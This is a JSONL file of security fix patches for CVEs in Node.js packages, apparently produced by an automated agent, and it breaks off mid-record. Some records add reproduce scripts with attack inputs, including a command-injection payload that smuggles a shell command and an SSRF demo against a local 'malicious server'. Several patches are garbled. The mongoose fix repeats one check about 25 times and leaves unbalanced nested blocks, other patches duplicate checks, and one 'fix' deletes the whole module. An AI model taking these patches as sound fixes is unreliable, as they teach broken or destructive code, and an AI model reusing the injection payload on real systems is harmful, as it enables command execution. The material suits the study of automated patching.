{"cve":"CVE-2020-28360:0708", "fix_patch": "diff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..27bc4a5\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,2 @@\n+const isPrivate = require('/workspace/private-ip');\n+console.log('10.999.999.999 should be false, is:', isPrivate('10.999.999.999'));\n\\ No newline at end of file\ndiff --git a/src/index.js b/src/index.js\nindex 0dc1033..280e5de 100644\n--- a/src/index.js\n+++ b/src/index.js\n@@ -1,9 +1,11 @@\n+const octet = '(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'\n+\n export default (ip) => (\n-  /^(::f{4}:)?10\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})$/i.test(ip) ||\n-  /^(::f{4}:)?192\\.168\\.([0-9]{1,3})\\.([0-9]{1,3})$/i.test(ip) ||\n-  /^(::f{4}:)?172\\.(1[6-9]|2\\d|30|31)\\.([0-9]{1,3})\\.([0-9]{1,3})$/i.test(ip) ||\n-  /^(::f{4}:)?127\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})$/i.test(ip) ||\n-  /^(::f{4}:)?169\\.254\\.([0-9]{1,3})\\.([0-9]{1,3})$/i.test(ip) ||\n+  new RegExp(`^(::f{4}:)?10(?:\\\\.${octet}){3}$`, 'i').test(ip) ||\n+  new RegExp(`^(::f{4}:)?192\\\\.168(?:\\\\.${octet}){2}$`, 'i').test(ip) ||\n+  new RegExp(`^(::f{4}:)?172\\\\.(1[6-9]|2[0-9]|3[01])(?:\\\\.${octet}){2}$`, 'i').test(ip) ||\n+  new RegExp(`^(::f{4}:)?127(?:\\\\.${octet}){3}$`, 'i').test(ip) ||\n+  new RegExp(`^(::f{4}:)?169\\\\.254(?:\\\\.${octet}){2}$`, 'i').test(ip) ||\n   /^f[cd][0-9a-f]{2}:/i.test(ip) ||\n   /^fe80:/i.test(ip) ||\n   /^::1$/.test(ip) ||\n"}
{"cve":"CVE-2017-16100:0708", "fix_patch": "diff --git a/lib/dns-sync.js b/lib/dns-sync.js\nindex 5f63607..fbf3e42 100644\n--- a/lib/dns-sync.js\n+++ b/lib/dns-sync.js\n@@ -1,9 +1,8 @@\n 'use strict';\n \n var net = require('net'),\n-    util = require('util'),\n     path = require('path'),\n-    shell = require('shelljs'),\n+    cp = require('child_process'),\n     debug = require('debug')('dns-sync');\n \n /**\n@@ -12,18 +11,18 @@ var net = require('net'),\n  */\n module.exports = {\n     resolve: function resolve(hostname) {\n-        var output,\n-            nodeBinary = process.execPath,\n-            scriptPath = path.join(__dirname, \"../scripts/dns-lookup-script\"),\n-            response,\n-            cmd = util.format('\"%s\" \"%s\" %s', nodeBinary, scriptPath, hostname);\n+        var output;\n \n-        response = shell.exec(cmd, {silent: true});\n-        if (response && response.code === 0) {\n-            output = response.output;\n-            if (output && net.isIP(output)) {\n-                return output;\n+        try {\n+            output = cp.execFileSync(process.execPath, [path.join(__dirname, '../scripts/dns-lookup-script'), hostname], {\n+                encoding: 'utf-8',\n+                timeout: 5000\n+            });\n+            if (output && net.isIP(output.trim())) {\n+                return output.trim();\n             }\n+        } catch (e) {\n+            //falls through\n         }\n         debug('hostname', \"fail to resolve hostname \" + hostname);\n         return null;\n"}
{"cve":"CVE-2021-23384:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 0102e84..4c3a3f2 100644\n--- a/index.js\n+++ b/index.js\n@@ -36,6 +36,9 @@ function removeTrailingSlashes(opts) {\n             querystring = ctx.querystring;\n             path = getPath(ctx.originalUrl, ctx.querystring);\n         }\n+        if (path && path.startsWith('//') && !path.startsWith('///')) {\n+            path = path.slice(1);\n+        }\n \n         if (path && haveSlash(path)) {\n             path = path.slice(0, -1);\n"}
{"cve":"CVE-2024-53900:0708", "fix_patch": "diff --git a/lib/helpers/populate/getModelsMapForPopulate.js b/lib/helpers/populate/getModelsMapForPopulate.js\nindex 16d920366..1f3bc3fac 100644\n--- a/lib/helpers/populate/getModelsMapForPopulate.js\n+++ b/lib/helpers/populate/getModelsMapForPopulate.js\n@@ -184,6 +184,104 @@ module.exports = function getModelsMapForPopulate(model, docs, options) {\n     if (hasMatchFunction) {\n       match = match.call(doc, doc);\n     }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    \n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    \n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n     data.match = match;\n     data.hasMatchFunction = hasMatchFunction;\n     data.isRefPath = isRefPath;\n@@ -342,6 +440,11 @@ module.exports = function getModelsMapForPopulate(model, docs, options) {\n       }\n     }\n \n+    if (match != null && typeof match === 'object' && (match.$where != null || Object.prototype.hasOwnProperty.call(match, '$where'))) {\n+      return new MongooseError('$where operator is not allowed in populate');\n+    }\n+\n+\n     if (!Array.isArray(modelNames)) {\n       modelNames = [modelNames];\n     }\n"}
{"cve":"CVE-2022-35949:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex b2144c84..5d8720f9 100644\n--- a/index.js\n+++ b/index.js\n@@ -53,6 +53,16 @@ function makeDispatcher (fn) {\n         throw new InvalidArgumentError('invalid opts.path')\n       }\n \n+      if (opts.path.startsWith('//') || opts.path.startsWith('\\\\\\\\')) {\n+        throw new InvalidArgumentError('invalid opts.path')\n+      }\n+\n+          if (opts.path.startsWith('//') || opts.path.startsWith('\\\\')) {\n+        throw new InvalidArgumentError('invalid opts.path')\n+      }\n+            if (opts.path.startsWith('//') || opts.path.startsWith('\\\\')) {\n+        throw new InvalidArgumentError('invalid opts.path')\n+      }\n       url = new URL(opts.path, util.parseOrigin(url))\n     } else {\n       if (!opts) {\ndiff --git a/lib/core/util.js b/lib/core/util.js\nindex 635ef2e1..eea85c7b 100644\n--- a/lib/core/util.js\n+++ b/lib/core/util.js\n@@ -115,6 +115,10 @@ function parseURL (url) {\n       ? url.path\n       : `${url.pathname || ''}${url.search || ''}`\n \n+    if (path.startsWith('//') || path.startsWith('\\\\')) {\n+      throw new InvalidArgumentError('invalid path')\n+    }\n+\n     url = new URL(path, origin)\n   }\n \ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 00000000..049ca008\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,19 @@\n+const undici = require('./index.js');\n+const http = require('http');\n+\n+const server = http.createServer((req, res) => {\n+  console.log('Request received on malicious server:', req.url);\n+  res.writeHead(200, { 'Content-Type': 'text/plain' });\n+  res.end('Success: Malicious server was reached.\\n');\n+  server.close();\n+}).listen(8080, '127.0.0.1', () => {\n+    console.log('Malicious server listening on http://127.0.0.1:8080/');\n+    undici.request({\n+        origin: 'http://example.com',\n+        pathname: '//127.0.0.1:8080'\n+    }).then(res => {\n+        console.log('Request to example.com finished.');\n+    }).catch(err => {\n+        console.error(\"error\", err);\n+    });\n+});\n"}
{"cve":"CVE-2022-0691:0708", "fix_patch": "diff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..82272f5\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,6 @@\n+\n+const parse = require('./index.js');\n+const u = parse('\\tftp://example.com');\n+if (u.protocol !== 'ftp:') {\n+    throw new Error(`protocol should be \"ftp:\", but got \"null\"`);\n+}\n"}
{"cve":"CVE-2019-10787:0708", "fix_patch": "diff --git a/index.js b/index.js\ndeleted file mode 100644\nindex 16654d1..0000000\n--- a/index.js\n+++ /dev/null\n@@ -1,185 +0,0 @@\n-var exec = require('child_process').exec;\n-var aspect = require('aspectratio');\n-var dirname = require('path').dirname;\n-var basename = require('path').basename;\n-var extname = require('path').extname;\n-var join = require('path').join;\n-var sprintf = require('util').format;\n-\n-module.exports = function(image, output, cb) {\n-  var cmd = module.exports.cmd(image, output);\n-  exec(cmd, {timeout: 30000}, function(e, stdout, stderr) {\n-    if (e) { return cb(e); }\n-    if (stderr) { return cb(new Error(stderr)); }\n-\n-    return cb(null, output.versions);\n-  });\n-};\n-\n-/**\n- * Get cropped geometry for given aspectratio\n- *\n- * @param object image - original image metadata\n- * @param string ratio - new aspect ratio\n- *\n- * @return object geometry\n- *  - string geometry - crop geometry; or null\n- *  - number width    - image version height\n- *  - number height   - image version width\n- */\n-module.exports.crop = function(image, ratio) {\n-  if (!ratio) {\n-    return { geometry: null, width: image.width, height: image.height };\n-  }\n-\n-  var g = aspect.crop(image.width, image.height, ratio);\n-\n-  // Check if the image already has the decired aspectratio.\n-  if (g[0] === 0 && g[1] === 0) {\n-    return { geometry: null, width: image.width, height: image.height };\n-  } else {\n-    return {\n-      geometry: sprintf('%dx%d+%d+%d', g[2], g[3], g[0], g[1]),\n-      width: g[2],\n-      height: g[3]\n-    };\n-  }\n-};\n-\n-/**\n- * Get resize geometry for max width and/or height\n- *\n- * @param object crop - image crop object\n- * @param object versin - image version object\n- *\n- * @return string geometry; null if no resize applies\n- */\n-module.exports.resize = function(crop, version) {\n-  var maxW = version.maxWidth;\n-  var maxH = version.maxHeight;\n-\n-  var resize = aspect.resize(crop.width, crop.height, maxW, maxH);\n-\n-  // Update version object\n-  version.width  = resize[0];\n-  version.height = resize[1];\n-\n-  if (maxW && maxH) {\n-    return maxW + 'x' + maxH;\n-  } else if (maxW) {\n-    return '' + maxW;\n-  } else if (maxH) {\n-    return 'x' + maxH;\n-  } else {\n-    return null;\n-  }\n-};\n-\n-/**\n- * Get new path with suffix\n- *\n- * @param string src - source image path\n- * @param string opts - output path transformations\n- *  * format\n- *  * suffix\n- *\n- * @return string path\n- */\n-module.exports.path = function(src, opts) {\n-  var dir = opts.path || dirname(src);\n-  var ext = extname(src);\n-  var base = basename(src, ext);\n-\n-  if (opts.format) {\n-    ext = '.' + opts.format;\n-  }\n-\n-  return join(dir, opts.prefix + base + opts.suffix + ext);\n-};\n-\n-/**\n- * Get convert command\n- *\n- * @param object image - original image object\n- * @param Array versions - derivated versions\n- *\n- * @return string convert command\n- */\n-module.exports.cmd = function(image, output) {\n-  var cmd = [\n-    sprintf(\n-      'convert %s -auto-orient -strip -write mpr:%s +delete', image.path, image.path\n-    )\n-  ];\n-\n-  for (var i = 0; i < output.versions.length; i++) {\n-    var version = output.versions[i];\n-    var last = (i === output.versions.length-1);\n-\n-    version.quality = version.quality || output.quality || 80;\n-\n-    version.path = module.exports.path(image.path, {\n-      format: version.format,\n-      path: output.path,\n-      prefix: version.prefix || output.prefix || '',\n-      suffix: version.suffix || ''\n-    });\n-\n-    cmd.push(module.exports.cmdVersion(image, version, last));\n-  }\n-\n-  return cmd.join(' ');\n-};\n-\n-/**\n- * Get convert command for single version\n- *\n- * @param object image - original image object\n- * @param object version - derivated version\n- * @patam boolean last - true if this is last version\n- *\n- * @return string version convert command\n- */\n-module.exports.cmdVersion = function(image, version, last) {\n-  var cmd = [];\n-\n-  // http://www.imagemagick.org/Usage/files/#mpr\n-  cmd.push(sprintf('mpr:%s', image.path));\n-\n-  // -quality\n-  if (version.quality) {\n-    cmd.push(sprintf('-quality %d', version.quality));\n-  }\n-\n-  // -background\n-  if (version.background) {\n-    cmd.push(sprintf('-background \"%s\"', version.background));\n-  }\n-\n-  // -flatten\n-  if (version.flatten) {\n-    cmd.push('-flatten');\n-  }\n-\n-  // -crop\n-  var crop = module.exports.crop(image, version.aspect);\n-  if (crop.geometry) {\n-    cmd.push(sprintf('-crop \"%s\"', crop.geometry));\n-  }\n-\n-  // -resize\n-  // http://www.imagemagick.org/script/command-line-processing.php#geometry\n-  var resize = module.exports.resize(crop, version);\n-  if (resize) {\n-    cmd.push(sprintf('-resize \"%s\"', resize));\n-  }\n-\n-  // -write\n-  if (last) {\n-    cmd.push(version.path);\n-  } else {\n-    cmd.push(sprintf('-write %s +delete', version.path));\n-  }\n-\n-  return cmd.join(' ');\n-};\n"}
{"cve":"CVE-2020-7687:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 2100676..13b902d 100644\n--- a/index.js\n+++ b/index.js\n@@ -13,6 +13,20 @@ module.exports = function (port, root, wordy) {\n         var uri = url.parse(req.url).pathname,\n             filename = path.join(root, uri);\n \n+        if (path.normalize(filename).indexOf(path.normalize(root)) !== 0) {\n+            if (wordy) console.log('Error 403');\n+            res.writeHead(403, {'Content-Type': 'text/plain'});\n+            res.end('Error 403');\n+            return;\n+        }\n+\n+if (path.normalize(filename).indexOf(path.normalize(root)) !== 0) {\n+if (wordy) console.log('Error 403');\n+res.writeHead(403, {'Content-Type': 'text/plain'});\n+res.end('Error 403');\n+return;\n+}\n+\n         if (uri.charAt(uri.length - 1) === '/') {\n             filename += 'index.html';\n         }\n"}
{"cve":"CVE-2018-16482:0708", "fix_patch": "diff --git a/lib/staticFileHandler.js b/lib/staticFileHandler.js\nindex cfdc1c7..a738d34 100644\n--- a/lib/staticFileHandler.js\n+++ b/lib/staticFileHandler.js\n@@ -21,8 +21,13 @@ module.exports = function staticFileListener(options, nextHandler){\n         if(mockedFilePath)\n             filePath = mockedFilePath;\n \n-        var file = path.normalize(path.join(root,filePath));\n-        fs.stat(file,function(error, stats){\n+        var file = path.normalize(path.join(root, filePath));\n+\n+        if (file.indexOf(root) !== 0) {\n+            return statusHandlers[500](res, nextHandler, { error: 'Directory traversal attempt detected' });\n+        }\n+\n+        fs.stat(file, function(error, stats) {\n             if(error)\n                 return statusHandlers[500](res, nextHandler, { error: error });\n \n"}
{"cve":"CVE-2021-23363:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex a827f37..4049701 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,16 +1,25 @@\n-'use strict'\n-\n-const exec = require('child_process').execSync\n+const exec = require('child_process').exec\n \n exports.killByPort = function (port) {\n-  var processId = null\n-  try {\n-    processId = exec(`lsof -t -i:${port}`)\n-  } catch (e) {\n+  const parsedPort = parseInt(port, 10)\n \n+  if (isNaN(parsedPort) || parsedPort.toString() !== port.toString()) {\n+    return\n   }\n \n-  if (processId !== null) { // if exists kill\n-    exec(`kill ${processId}`)\n-  }\n+  const command = `lsof -t -i:${port}`\n+\n+  exec(command, (err, stdout, stderr) => {\n+    if (err) {\n+      return\n+    }\n+\n+    const processId = stdout.trim()\n+\n+    if (processId) {\n+      try {\n+        exec(`kill ${processId}`)\n+      } catch (e) {}\n+    }\n+  })\n }\n"}
{"cve":"CVE-2019-10788:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex d85f5ff..67423e4 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,7 +1,7 @@\n /*jshint laxbreak:true */\n \n var sizeParser = require('filesize-parser');\n-var exec = require('child_process').exec, child;\n+var execFile = require('child_process').execFile;\n \n module.exports = function(path, opts, cb) {\n   if (!cb) {\n@@ -9,19 +9,6 @@ module.exports = function(path, opts, cb) {\n     opts = {};\n   }\n \n-  var cmd = module.exports.cmd(path, opts);\n-  opts.timeout = opts.timeout || 5000;\n-\n-  exec(cmd, opts, function(e, stdout, stderr) {\n-    if (e) { return cb(e); }\n-    if (stderr) { return cb(new Error(stderr)); }\n-\n-    return cb(null, module.exports.parse(path, stdout, opts));\n-  });\n-};\n-\n-module.exports.cmd = function(path, opts) {\n-  opts = opts || {};\n   var format = [\n     'name=',\n     'size=%[size]',\n@@ -33,7 +20,16 @@ module.exports.cmd = function(path, opts) {\n     (opts.exif ? '%[exif:*]' : '')\n   ].join(\"\\n\");\n \n-  return 'identify -format \"' + format + '\" ' + path;\n+  var args = ['-format', format, path];\n+\n+  opts.timeout = opts.timeout || 5000;\n+\n+  execFile('identify', args, opts, function(e, stdout, stderr) {\n+    if (e) { return cb(e); }\n+    if (stderr) { return cb(new Error(stderr)); }\n+\n+    return cb(null, module.exports.parse(path, stdout, opts));\n+  });\n };\n \n module.exports.parse = function(path, stdout, opts) {\n@@ -81,9 +77,9 @@ module.exports.parse = function(path, stdout, opts) {\n \n   if (opts && opts.autoOrient\n       && ( ret.orientation === 'LeftTop'\n-        ||\u00a0ret.orientation === 'RightTop'\n-        ||\u00a0ret.orientation === 'LeftBottom'\n-        ||\u00a0ret.orientation === 'RightBottom')) {\n+        || ret.orientation === 'RightTop'\n+        || ret.orientation === 'LeftBottom'\n+        || ret.orientation === 'RightBottom')) {\n \n     ret.width  = ret.width + ret.height;\n     ret.height = ret.width - ret.height;\n@@ -91,4 +87,4 @@ module.exports.parse = function(path, stdout, opts) {\n   }\n \n   return ret;\n-};\n+};\n\\ No newline at end of file\n"}
{"cve":"CVE-2020-7675:0708", "fix_patch": "diff --git a/src/messenger-node.js b/src/messenger-node.js\nindex ec76b26..b5f0023 100755\n--- a/src/messenger-node.js\n+++ b/src/messenger-node.js\n@@ -67,10 +67,10 @@ const messenger = {\n   },\n   line: color => {\n     if (color.length > 0) {\n-      try {\n-        eval(`cl.${color}()`); // eslint-disable-line\n-      }\n-      catch (e) {\n+      const colorFunc = cl[color];\n+      if (typeof colorFunc === 'function') {\n+        colorFunc();\n+      } else {\n         console.error(chalk.bgRed.bold(`Invalid Color: ${color}`));\n       }\n     }\n"}
{"cve":"CVE-2019-15597:0708", "fix_patch": "diff --git a/lib/index.js b/lib/index.js\nindex 767584b..8764e61 100644\n--- a/lib/index.js\n+++ b/lib/index.js\n@@ -1,4 +1,4 @@\n-var exec = require('child_process').exec\n+var execFile = require('child_process').execFile\n var parse = require('./parse')\n \n module.exports = function df(aOptions, aCallback) {\n@@ -33,12 +33,13 @@ module.exports = function df(aOptions, aCallback) {\n \n     // TODO: should fail if unit is not a string\n \n-    var command = 'df -kP'\n+    var args = [ '-kP' ]\n+\n     if (options.file) {\n-        command += ' ' + options.file\n+        args.push(options.file)\n     }\n \n-    exec(command, function(err, stdout, stderr) {\n+    execFile('df', args, function(err, stdout, stderr) {\n         if (err) {\n             callback(err)\n             return\n"}
{"cve":"CVE-2020-7627:0708", "fix_patch": "diff --git a/key-sender.js b/key-sender.js\nindex 2093f04..85c42c0 100644\n--- a/key-sender.js\n+++ b/key-sender.js\n@@ -112,7 +112,7 @@ module.exports = function() {\n         return new Promise(function(resolve, reject) {\n             var jarPath = path.join(__dirname, 'jar', 'key-sender.jar');\n \n-            var command = 'java -jar \\\"' + jarPath + '\\\" ' + arrParams.join(' ') + module.getCommandLineOptions();\n+                    var command = 'java -jar \\\"' + jarPath + '\\\" ' + arrParams.map(function(p) { return '\"' + p.replace(/[\\\"\\`\\$]/g, '\\\\$&') + '\"'; }).join(' ') + module.getCommandLineOptions();\n \n             return exec(command, {}, function(error, stdout, stderr) {\n                 if (error == null) {\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..ca7a220\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,9 @@\n+\n+const ks = require('./key-sender.js');\n+\n+// This is a malicious payload that will create a file named 'exploited' in the root directory.\n+const maliciousPayload = ['\"& touch /tmp/exploited #\"'];\n+\n+ks.execute(maliciousPayload)\n+  .then(() => console.log('Payload executed.'))\n+  .catch(err => console.error('Error:', err));\n"}
{"cve":"CVE-2020-7631:0708", "fix_patch": "diff --git a/lib/posix.js b/lib/posix.js\nindex 76b4b98..ba31cbc 100644\n--- a/lib/posix.js\n+++ b/lib/posix.js\n@@ -1,14 +1,10 @@\n 'use strict';\n \n-var exec = require('child_process').exec;\n+var execFile = require('child_process').execFile;\n var isDigits = require('./utils').isDigits;\n \n function diskusage(path, cb) {\n-    if (path.indexOf('\"') !== -1) {\n-        return cb(new Error('Paths with double quotes are not supported yet'));\n-    }\n-\n-    exec('df -k \"' + path + '\"', function(err, stdout) {\n+     execFile('df', ['-k', path], function(err, stdout) {\n         if (err) {\n             return cb(err);\n         }\n"}
{"cve":"CVE-2020-7795:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex a207f28..33c12af 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,6 +1,11 @@\n+const { execFileSync } = require('child_process');\n+\n module.exports = function (packageName, { registry = '', timeout = null } = {}) {\n     try {\n-        let version;\n+        const args = ['view', packageName, 'version'];\n+        if (registry) {\n+            args.push('--registry', registry);\n+        }\n \n         const config = {\n             stdio: ['pipe', 'pipe', 'ignore']\n@@ -10,19 +15,14 @@ module.exports = function (packageName, { registry = '', timeout = null } = {})\n             config.timeout = timeout;\n         }\n \n-        if (registry) {\n-            version = require('child_process').execSync(`npm view ${packageName} version --registry ${registry}`, config);\n-        } else {\n-            version = require('child_process').execSync(`npm view ${packageName} version`, config);\n-        }\n+        const version = execFileSync('npm', args, config);\n \n         if (version) {\n             return version.toString().trim().replace(/^\\n*/, '').replace(/\\n*$/, '');\n         } else {\n             return null;\n         }\n-\n-    } catch(err) {\n+    } catch (err) {\n         return null;\n     }\n-}\n+};\n"}
{"cve":"CVE-2018-3772:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 88a62e9..2861c5f 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,31 +1,5 @@\n-var cp = require('child_process');\n+var which = require('which');\n \n module.exports = function whereis(name, cb) {\n-  cp.exec('which ' + name, function(error, stdout, stderr) {\n-    stdout = stdout.split('\\n')[0];\n-    if (error || stderr || stdout === '' || stdout.charAt(0) !== '/') {\n-      stdout = stdout.split('\\n')[0];\n-      cp.exec('whereis ' + name, function(error, stdout, stderr) {\n-        if (error || stderr || stdout === '' || stdout.indexOf( '/' ) === -1) {\n-          cp.exec('where ' + name, function (error, stdout, stderr) { //windows\n-            if (error || stderr || stdout === '' || stdout.indexOf('\\\\') === -1) {\n-              cp.exec('for %i in (' + name + '.exe) do @echo. %~$PATH:i', function (error, stdout, stderr) { //windows xp\n-                if (error || stderr || stdout === '' || stdout.indexOf('\\\\') === -1) {\n-                  return cb(new Error('Could not find ' + name + ' on your system'));\n-                }\n-                return cb(null, stdout);\n-              });\n-            } else {\n-              return cb(null, stdout);\n-            }\n-          });\n-        }\n-        else {\n-          return cb(null, stdout.split(' ')[1]);\n-        }\n-      });\n-    } else {\n-      return cb(null, stdout);\n-    }\n-  });\n+  which(name, cb);\n };\ndiff --git a/package.json b/package.json\nindex 92ad9a5..114020e 100644\n--- a/package.json\n+++ b/package.json\n@@ -1,8 +1,8 @@\n {\n   \"name\": \"whereis\",\n-  \"version\": \"0.4.0\",\n+  \"version\": \"0.4.1\",\n   \"author\": \"Vincent Voyer <vincent@zeroload.net>\",\n-  \"description\": \"Which/Whereis easy helper, find if a program exists\",\n+  \"description\": \"DEPRECATED, use 'which' module instead\",\n   \"keywords\": [\n     \"which\",\n     \"whereis\",\n@@ -13,6 +13,9 @@\n   ],\n   \"license\": \"MIT\",\n   \"repository\": \"git://github.com/vvo/node-whereis.git\",\n+  \"dependencies\": {\n+    \"which\": \"1.0.9\"\n+  },\n   \"devDependencies\": {\n     \"tap\": \"0.6.0\"\n   },\n"}
{"cve":"CVE-2020-7640:0708", "fix_patch": "diff --git a/class.js b/class.js\nindex 28476eb..107d524 100644\n--- a/class.js\n+++ b/class.js\n@@ -6,99 +6,99 @@ var util = require(\"util\");\n var events = require(\"events\");\n \n exports.create = function create(members) {\n-\t// create new class using php-style syntax (sort of)\n-\tif (!members) members = {};\n-\t\n-\t// setup constructor\n-\tvar constructor = null;\n-\t\n-\t// inherit from parent class\n-\tif (members.__parent) {\n-\t\tif (members.__construct) {\n-\t\t\t// explicit constructor passed in\n-\t\t\tconstructor = members.__construct;\n-\t\t}\n-\t\telse {\n-\t\t\t// inherit parent's constructor\n-\t\t\tvar code = members.__parent.toString();\n-\t\t\tvar args = code.substring( code.indexOf(\"(\")+1, code.indexOf(\")\") );\n-\t\t\tvar inner_code = code.substring( code.indexOf(\"{\")+1, code.lastIndexOf(\"}\") );\n-\t\t\teval('constructor = function ('+args+') {'+inner_code+'};');\n-\t\t}\n-\t\t\n-\t\t// inherit rest of parent members\n-\t\tutil.inherits(constructor, members.__parent);\n-\t\tdelete members.__parent;\n-\t}\n-\telse {\n-\t\t// create new base class\n-\t\tconstructor = members.__construct || function() {};\n-\t}\n-\tdelete members.__construct;\n-\t\n-\t// handle static variables\n-\tif (members.__static) {\n-\t\tfor (var key in members.__static) {\n-\t\t\tconstructor[key] = members.__static[key];\n-\t\t}\n-\t\tdelete members.__static;\n-\t}\n-\t\n-\t// all classes are event emitters unless explicitly disabled\n-\tif (members.__events !== false) {\n-\t\tif (!members.__mixins) members.__mixins = [];\n-\t\tif (members.__mixins.indexOf(events.EventEmitter) == -1) {\n-\t\t\tmembers.__mixins.push( events.EventEmitter );\n-\t\t}\n-\t}\n-\tdelete members.__events;\n-\t\n-\t// handle mixins\n-\tif (members.__mixins) {\n-\t\tfor (var idx = 0, len = members.__mixins.length; idx < len; idx++) {\n-\t\t\tvar class_obj = members.__mixins[idx];\n-\t\t\t\n-\t\t\tfor (var key in class_obj.prototype) {\n-\t\t\t\tif (!key.match(/^__/) && (typeof(constructor.prototype[key]) == 'undefined')) {\n-\t\t\t\t\tconstructor.prototype[key] = class_obj.prototype[key];\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tvar static_members = class_obj.__static;\n-\t\t\tif (static_members) {\n-\t\t\t\tfor (var key in static_members) {\n-\t\t\t\t\tif (typeof(constructor[key]) == 'undefined') constructor[key] = static_members[key];\n-\t\t\t\t}\n-\t\t\t}\n-\t\t} // foreach mixin\n-\t\tdelete members.__mixins;\n-\t} // mixins\n-\t\n-\t// handle promisify (node 8+)\n-\tif (members.__promisify && util.promisify) {\n-\t\tif (Array.isArray(members.__promisify)) {\n-\t\t\t// promisify some\n-\t\t\tmembers.__promisify.forEach( function(key) 